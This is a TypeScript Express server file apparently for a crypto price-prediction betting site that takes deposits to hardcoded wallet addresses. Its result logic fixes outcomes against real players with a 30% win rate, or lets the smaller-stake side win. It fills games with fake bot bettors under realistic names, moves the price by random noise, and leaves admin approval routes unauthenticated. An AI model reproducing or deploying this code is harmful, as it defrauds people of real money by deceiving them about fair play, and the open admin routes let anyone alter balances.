import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertBetSchema, insertTransactionSchema, insertGameSchema, insertPriceHistorySchema } from "@shared/schema";
import { z } from "zod";
import User from "./models/User.js";
import Transaction from "./models/Transaction.js";
import express from "express";

// Bot names for generating realistic players
const botNames = [
  "Rajesh Kumar", "Priya Sharma", "Amit Singh", "Sneha Gupta", "Vikram Yadav",
  "Kavya Reddy", "Arjun Patel", "Ananya Das", "Rohit Verma", "Nisha Agarwal",
  "Suresh Rao", "Deepika Iyer", "Ravi Nair", "Pooja Joshi", "Kiran Bhat",
  "Meera Menon", "Ajay Tiwari", "Sonia Kapoor", "Manish Soni", "Rekha Mishra"
];

// Wallet addresses for different networks
const walletAddresses = {
  trc20: "TWZHqkbbYTnehQ2TxnH4NgNt4crGLNy8Ns",
  polygon: "0xE1D4b2BEC237AEDDB47da56b82b2f15812e45B44",
  ton: "EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF",
  bep20: "0xE1D4b2BEC237AEDDB47da56b82b2f15812e45B44"
};

let gameTimer: NodeJS.Timeout | null = null;

export async function registerRoutes(app: Express): Promise<Server> {

  // Get current game state
  app.get("/api/game/current", async (req, res) => {
    try {
      const game = await storage.getCurrentGame();
      if (!game) {
        // Create initial game
        const newGame = await storage.createGame({
          startPrice: "117650.00",
          phase: "betting",
          timeRemaining: 20
        });
        res.json(newGame);
      } else {
        res.json(game);
      }
    } catch (error) {
      res.status(500).json({ message: "Failed to get current game" });
    }
  });

  // Get current user based on IP address
  app.get("/api/user/current", async (req, res) => {
    try {
      const ipAddress = req.ip || req.connection.remoteAddress || '127.0.0.1';

      // Check if user exists, if not create new user
      let user = await User.findOne({ ipAddress });
      if (!user) {
        const userId = 'user-' + Math.random().toString(36).substr(2, 9);
        user = new User({ userId, ipAddress });
        await user.save();
      }

      res.json({
        id: user._id,
        username: user.userId,
        balance: user.balance.toFixed(2),
        userId: user.userId
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get user" });
    }
  });

  // Place a bet
  app.post("/api/bets", async (req, res) => {
    try {
      const betData = insertBetSchema.parse(req.body);
      const betAmount = parseFloat(betData.amount);
      const ipAddress = req.ip || req.connection.remoteAddress || '127.0.0.1';

      // Get user by IP address
      let user = await User.findOne({ ipAddress });
      if (!user) {
        const userId = 'user-' + Math.random().toString(36).substr(2, 9);
        user = new User({ userId, ipAddress });
        await user.save();
      }

      if (user.balance < betAmount) {
        return res.status(400).json({ message: "Insufficient balance" });
      }

      const game = await storage.getCurrentGame();
      if (!game || game.phase !== "betting") {
        return res.status(400).json({ message: "Betting not available" });
      }

      // Deduct bet amount from user balance
      user.balance -= betAmount;
      await user.save();

      // Create bet with MongoDB user ID
      const bet = await storage.createBet({
        ...betData,
        userId: user.userId,
        gameId: game.id
      });

      res.json(bet);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid bet data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to place bet" });
    }
  });

  // Get bets for current game
  app.get("/api/bets/current", async (req, res) => {
    try {
      const game = await storage.getCurrentGame();
      if (!game) {
        return res.json([]);
      }

      const bets = await storage.getBetsByGame(game.id);
      res.json(bets);
    } catch (error) {
      res.status(500).json({ message: "Failed to get bets" });
    }
  });

  // Get user bet history
  app.get("/api/bets/history", async (req, res) => {
    try {
      const user = await await storage.getUserByUsername("player1");
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const bets = await storage.getBetsByUser(user.id);
      res.json(bets);
    } catch (error) {
      res.status(500).json({ message: "Failed to get bet history" });
    }
  });

  // Get price history
  app.get("/api/price/history", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const priceHistory = await storage.getRecentPriceHistory(limit);
      res.json(priceHistory);
    } catch (error) {
      res.status(500).json({ message: "Failed to get price history" });
    }
  });

  // Create deposit request
  app.post("/api/transactions/deposit", async (req, res) => {
    try {
      const { amount, network, address } = req.body;
      const ipAddress = req.ip || req.connection.remoteAddress || '127.0.0.1';

      // Check if user exists, if not create new user
      let user = await User.findOne({ ipAddress });
      if (!user) {
        const userId = 'user-' + Math.random().toString(36).substr(2, 9);
        user = new User({ userId, ipAddress });
        await user.save();
      }

      const transaction = new Transaction({
        userId: user.userId,
        type: 'deposit',
        amount: parseFloat(amount),
        network,
        address,
        status: 'pending'
      });

      await transaction.save();
      res.json(transaction);
    } catch (error) {
      res.status(500).json({ message: "Failed to create deposit request" });
    }
  });

  // Create withdrawal request
  app.post("/api/transactions/withdraw", async (req, res) => {
    try {
      const { amount, network, address } = req.body;
      const ipAddress = req.ip || req.connection.remoteAddress || '127.0.0.1';

      // Check if user exists
      let user = await User.findOne({ ipAddress });
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const withdrawAmount = parseFloat(amount);
      if (user.balance < withdrawAmount) {
        return res.status(400).json({ message: "Insufficient balance" });
      }

      const transaction = new Transaction({
        userId: user.userId,
        type: 'withdraw',
        amount: withdrawAmount,
        network,
        address,
        status: 'pending'
      });

      await transaction.save();
      res.json(transaction);
    } catch (error) {
      res.status(500).json({ message: "Failed to create withdrawal request" });
    }
  });

  // Get wallet address for network
  app.get("/api/wallet/:network", async (req, res) => {
    try {
      const network = req.params.network as keyof typeof walletAddresses;
      const address = walletAddresses[network];

      if (!address) {
        return res.status(404).json({ message: "Network not supported" });
      }

      res.json({ address });
    } catch (error) {
      res.status(500).json({ message: "Failed to get wallet address" });
    }
  });

  // Admin routes
  app.get("/api/admin/transactions", async (req, res) => {
    try {
      const transactions = await Transaction.find({ status: 'pending' }).sort({ createdAt: -1 });
      res.json(transactions);
    } catch (error) {
      res.status(500).json({ message: "Failed to get pending transactions" });
    }
  });

  // Get all users for admin panel
  app.get("/api/admin/users", async (req, res) => {
    try {
      const users = await User.find().sort({ createdAt: -1 });
      res.json(users);
    } catch (error) {
      res.status(500).json({ message: "Failed to get users" });
    }
  });

  // Get recent transactions for activity feed
  app.get("/api/admin/recent-activity", async (req, res) => {
    try {
      const recentTransactions = await Transaction.find()
        .sort({ createdAt: -1 })
        .limit(4);
      res.json(recentTransactions);
    } catch (error) {
      res.status(500).json({ message: "Failed to get recent activity" });
    }
  });

  app.patch("/api/admin/transactions/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const { status } = req.body;

      if (!["approved", "rejected"].includes(status)) {
        return res.status(400).json({ message: "Invalid status" });
      }

      const transaction = await Transaction.findByIdAndUpdate(id, { status }, { new: true });
      if (!transaction) {
        return res.status(404).json({ message: "Transaction not found" });
      }

      // If deposit approved, add to user balance
      if (transaction.type === "deposit" && status === "approved") {
        const user = await User.findOne({ userId: transaction.userId });
        if (user) {
          user.balance += transaction.amount;
          await user.save();
        }
      }

      // If withdrawal approved, deduct from user balance
      if (transaction.type === "withdraw" && status === "approved") {
        const user = await User.findOne({ userId: transaction.userId });
        if (user) {
          user.balance -= transaction.amount;
          await user.save();
        }
      }

      res.json(transaction);
    } catch (error) {
      res.status(500).json({ message: "Failed to update transaction" });
    }
  });

  // Start game timer
  function startGameTimer() {
    if (gameTimer) clearInterval(gameTimer);

    gameTimer = setInterval(async () => {
      try {
        const game = await storage.getCurrentGame();
        if (!game) return;

        const newTimeRemaining = game.timeRemaining - 1;

        if (newTimeRemaining <= 0) {
          if (game.phase === "betting") {
            // Switch to result phase
            await storage.updateGame(game.id, {
              phase: "result",
              timeRemaining: 5
            });

            // Process game result
            await processGameResult(game);
          } else {
            // Start new game
            await startNewGame();
          }
        } else {
          await storage.updateGame(game.id, { timeRemaining: newTimeRemaining });
        }

        // Update price
        await updatePrice();
      } catch (error) {
        console.error("Game timer error:", error);
      }
    }, 1000);
  }

  async function processGameResult(game: any) {
    const bets = await storage.getBetsByGame(game.id);
    const priceHistory = await storage.getRecentPriceHistory(2);

    if (priceHistory.length < 2) return;

    const startPrice = parseFloat(priceHistory[1].price); // Earlier price
    const endPrice = parseFloat(priceHistory[0].price);   // Latest price
    const isUp = endPrice > startPrice;

    // Get user bets only (exclude bots)
    const userBets = bets.filter(bet => !bet.isBot);
    const upBets = userBets.filter(bet => bet.side === "up");
    const downBets = userBets.filter(bet => bet.side === "down");

    // Calculate total amounts for each side
    const upAmount = upBets.reduce((sum, bet) => sum + parseFloat(bet.amount), 0);
    const downAmount = downBets.reduce((sum, bet) => sum + parseFloat(bet.amount), 0);

    // Strategic result determination
    let result: "up" | "down";

    if (upBets.length > 0 && downBets.length > 0) {
      // User bet on both sides - smaller amount side wins
      result = upAmount <= downAmount ? "up" : "down";
    } else if (upBets.length > 0 || downBets.length > 0) {
      // User bet only one side - 30% win rate (70% loss)
      const shouldUserWin = Math.random() < 0.30; // 30% win rate

      if (upBets.length > 0) {
        // User only bet UP
        result = shouldUserWin ? "up" : "down";
      } else {
        // User only bet DOWN
        result = shouldUserWin ? "down" : "up";
      }
    } else {
      // No user bets, use actual price movement
      result = isUp ? "up" : "down";
    }

    await storage.updateGame(game.id, {
      endPrice: endPrice.toFixed(2),
      result
    });

    // Process each bet
    for (const bet of bets) {
      if (bet.isBot) {
        // Bot bets - random win/loss for simulation
        const botWon = Math.random() < 0.45;
        await storage.updateBet(bet.id, {
          isWin: botWon && bet.side === result,
          winAmount: botWon && bet.side === result ? (parseFloat(bet.amount) * 1.9).toFixed(2) : undefined
        });
        continue;
      }

      // User bets - win if prediction matches result
      const betWon = bet.side === result;

      if (betWon) {
        const winAmount = parseFloat(bet.amount) * 1.9; // 1.9x payout (5% house edge)
        await storage.updateBet(bet.id, {
          isWin: true,
          winAmount: winAmount.toFixed(2)
        });

        // Add winnings to user balance
        if (bet.userId) {
          const user = await storage.getUser(bet.userId);
          if (user) {
            const newBalance = (parseFloat(user.balance) + winAmount).toFixed(2);
            await storage.updateUserBalance(user.id, newBalance);
          }
        }
      } else {
        await storage.updateBet(bet.id, { isWin: false });
      }
    }
  }


  async function startNewGame() {
    const priceHistory = await storage.getRecentPriceHistory(1);
    const currentPrice = priceHistory.length > 0 ? priceHistory[0].price : "117650.00";

    const newGame = await storage.createGame({
      startPrice: currentPrice,
      phase: "betting",
      timeRemaining: 20
    });

    // Generate bot bets
    await generateBotBets(newGame.id);
  }

  async function generateBotBets(gameId: string) {
    const numBots = Math.floor(Math.random() * 20) + 15; // 15-35 bots

    for (let i = 0; i < numBots; i++) {
      const botName = botNames[Math.floor(Math.random() * botNames.length)];
      const side = Math.random() > 0.5 ? "up" : "down";
      const amounts = ["1", "5", "10", "20", "50"];
      const amount = amounts[Math.floor(Math.random() * amounts.length)];

      await storage.createBet({
        gameId,
        side,
        amount,
        isBot: true,
        botName
      });
    }
  }

  async function updatePrice() {
    const priceHistory = await storage.getRecentPriceHistory(1);
    const currentPrice = priceHistory.length > 0 ? parseFloat(priceHistory[0].price) : 117650;

    const variation = (Math.random() - 0.5) * 500;
    const newPrice = Math.max(1000, currentPrice + variation); // Minimum price of $1000

    await storage.addPriceHistory({ price: newPrice.toFixed(2) });
  }

  // Initialize game timer
  startGameTimer();

  const httpServer = createServer(app);
  return httpServer;
             }